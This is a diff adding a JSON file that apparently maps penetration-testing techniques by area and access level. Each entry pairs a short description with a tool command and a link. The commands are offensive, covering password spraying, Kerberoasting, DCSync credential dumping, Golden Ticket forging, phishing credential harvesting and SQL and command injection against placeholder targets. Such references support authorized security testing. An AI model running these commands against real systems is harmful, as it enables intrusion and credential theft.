@@ -1,0 +1,231 @@
+{
+  "Active Directory": {
+    "No Access": {
+      "Password spraying": {
+        "description": "Brute-force weak passwords across multiple accounts to avoid account lockout.",
+        "tools": {
+          "CrackMapExec": {
+            "command": "crackmapexec smb 10.0.0.0/24 -u users.txt -p passwords.txt --continue-on-success",
+            "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying"
+          },
+          "Hydra": {
+            "command": "hydra -L users.txt -P passwords.txt ldap://10.0.0.1",
+            "link": "https://www.kali.org/tools/hydra/"
+          }
+        }
+      },
+      "AS-REP Roasting": {
+        "description": "Request TGTs for users with pre-auth disabled to extract and crack password hashes offline.",
+        "tools": {
+          "Rubeus": {
+            "command": "Rubeus.exe asreproast",
+            "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/as-rep-roasting"
+          },
+          "Impacket - GetNPUsers": {
+            "command": "GetNPUsers.py example.com/ -no-pass -usersfile users.txt",
+            "link": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py"
+          }
+        }
+      },
+      "Subdomain enumeration": {
+        "description": "Discover subdomains using passive or active DNS enumeration techniques.",
+        "tools": {
+          "Sublist3r": {
+            "command": "sublist3r -d example.com",
+            "link": "https://github.com/aboul3la/Sublist3r"
+          },
+          "Amass": {
+            "command": "amass enum -d example.com",
+            "link": "https://github.com/owasp-amass/amass"
+          }
+        }
+      },
+      "Phishing campaigns": {
+        "description": "Trick users into providing credentials or running malicious files via crafted emails or links.",
+        "tools": {
+          "Gophish": {
+            "command": "Use Gophish dashboard to create campaign & send payloads",
+            "link": "https://getgophish.com/"
+          },
+          "Evilginx2": {
+            "command": "sudo ./evilginx -p ./phishlets/office365.yaml",
+            "link": "https://github.com/kgretzky/evilginx2"
+          },
+          "SET Toolkit": {
+            "command": "setoolkit # \u2192 Social Engineering Attacks \u2192 Credential Harvester",
+            "link": "https://github.com/trustedsec/social-engineer-toolkit"
+          }
+        }
+      }
+    },
+    "User Level Access": {
+      "Kerberoasting": {
+        "description": "Extract and crack service account hashes from Kerberos tickets to escalate privileges.",
+        "tools": {
+          "Rubeus": {
+            "command": "Rubeus.exe kerberoast /user:targetuser /domain:example.com /rc4opsec",
+            "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting"
+          },
+          "Impacket - GetUserSPNs": {
+            "command": "python GetUserSPNs.py domain/user:password -dc-ip 10.0.0.1 -request",
+            "link": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py"
+          }
+        }
+      },
+      "ACL enumeration": {
+        "description": "Enumerate Active Directory object permissions to identify privilege escalation paths.",
+        "tools": {
+          "BloodHound": {
+            "command": "SharpHound.exe -c All",
+            "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound"
+          },
+          "ADExplorer": {
+            "command": "Manual GUI-based inspection of AD structure",
+            "link": "https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer"
+          }
+        }
+      }
+    },
+    "Admin Level Access": {
+      "DCSync Attack": {
+        "description": "Abuse domain replication privileges to dump credentials from a domain controller.",
+        "tools": {
+          "Mimikatz": {
+            "command": "lsadump::dcsync /domain:example.com /user:krbtgt",
+            "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync"
+          },
+          "Impacket - secretsdump": {
+            "command": "secretsdump.py domain/admin:password@dc-ip",
+            "link": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py"
+          }
+        }
+      },
+      "Golden Ticket Attack": {
+        "description": "Forge Kerberos TGTs using KRBTGT hash for persistent access.",
+        "tools": {
+          "Mimikatz": {
+            "command": "kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-XXXXX /krbtgt:NTLM_HASH /ptt",
+            "link": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket"
+          }
+        }
+      }
+    }
+  },
+  "Web Application Security": {
+    "Black-box (no credentials)": {
+      "SQL Injection": {
+        "description": "Inject SQL code into queries via input fields to access or manipulate databases.",
+        "tools": {
+          "sqlmap": {
+            "command": "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
+            "link": "https://github.com/sqlmapproject/sqlmap"
+          },
+          "NoSQLMap": {
+            "command": "nosqlmap -u 'http://target.com/login'",
+            "link": "https://github.com/codingo/NoSQLMap"
+          }
+        }
+      },
+      "Directory brute-forcing": {
+        "description": "Guess hidden paths and resources on web servers using wordlists.",
+        "tools": {
+          "Gobuster": {
+            "command": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+            "link": "https://github.com/OJ/gobuster"
+          },
+          "Dirsearch": {
+            "command": "python3 dirsearch.py -u http://target.com",
+            "link": "https://github.com/maurosoria/dirsearch"
+          }
+        }
+      }
+    },
+    "Authenticated (user)": {
+      "IDOR": {
+        "description": "Access unauthorized data by manipulating object references like user IDs or filenames.",
+        "tools": {
+          "Burp Suite": {
+            "command": "Use Burp Repeater to test object ID tampering in endpoints",
+            "link": "https://portswigger.net/web-security/access-control/idor"
+          },
+          "ffuf": {
+            "command": "ffuf -u http://target.com/profile?id=FUZZ -w users.txt",
+            "link": "https://github.com/ffuf/ffuf"
+          }
+        }
+      },
+      "Stored XSS": {
+        "description": "Inject persistent malicious scripts into web pages viewed by other users.",
+        "tools": {
+          "XSStrike": {
+            "command": "xsstrike -u http://target.com/comment",
+            "link": "https://github.com/s0md3v/XSStrike"
+          },
+          "Burp Suite": {
+            "command": "Inject payloads via Burp Repeater, use DOM Invader to test sinks",
+            "link": "https://portswigger.net/web-security/cross-site-scripting"
+          }
+        }
+      }
+    },
+    "Admin Access": {
+      "RCE via Admin Panel": {
+        "description": "Execute system commands remotely by exploiting vulnerable admin interfaces.",
+        "tools": {
+          "Commix": {
+            "command": "commix --url='http://target.com/admin?cmd=ls'",
+            "link": "https://github.com/commixproject/commix"
+          },
+          "Burp Suite": {
+            "command": "Test injection in form fields or parameters with system commands",
+            "link": "https://book.hacktricks.xyz/pentesting-web/command-injection"
+          }
+        }
+      }
+    }
+  },
+  "Cloud Security": {
+    "IAM Misconfigurations": {
+      "ScoutSuite": {
+        "command": "scout suite aws",
+        "link": "https://github.com/nccgroup/ScoutSuite"
+      },
+      "Pacu": {
+        "command": "pacu --module iam__enum_users",
+        "link": "https://github.com/RhinoSecurityLabs/pacu"
+      }
+    },
+    "S3 Bucket Exploitation": {
+      "AWS CLI": {
+        "command": "aws s3 ls s3://bucket-name --no-sign-request",
+        "link": "https://book.hacktricks.xyz/cloud-security/aws-security/aws-s3-buckets"
+      },
+      "s3scanner": {
+        "command": "s3scanner -b bucket-name-list.txt",
+        "link": "https://github.com/sa7mon/S3Scanner"
+      }
+    }
+  },
+  "Mobile Application Security": {
+    "Static Analysis": {
+      "MobSF": {
+        "command": "python manage.py runserver 127.0.0.1:8000",
+        "link": "https://github.com/MobSF/Mobile-Security-Framework-MobSF"
+      },
+      "APKTool": {
+        "command": "apktool d app.apk",
+        "link": "https://ibotpeaches.github.io/Apktool/"
+      }
+    },
+    "Runtime Instrumentation": {
+      "Frida": {
+        "command": "frida -U -n app_process",
+        "link": "https://frida.re/"
+      },
+      "Objection": {
+        "command": "objection -g com.target.app explore",
+        "link": "https://github.com/sensepost/objection"
+      }
+    }
+  }
+}
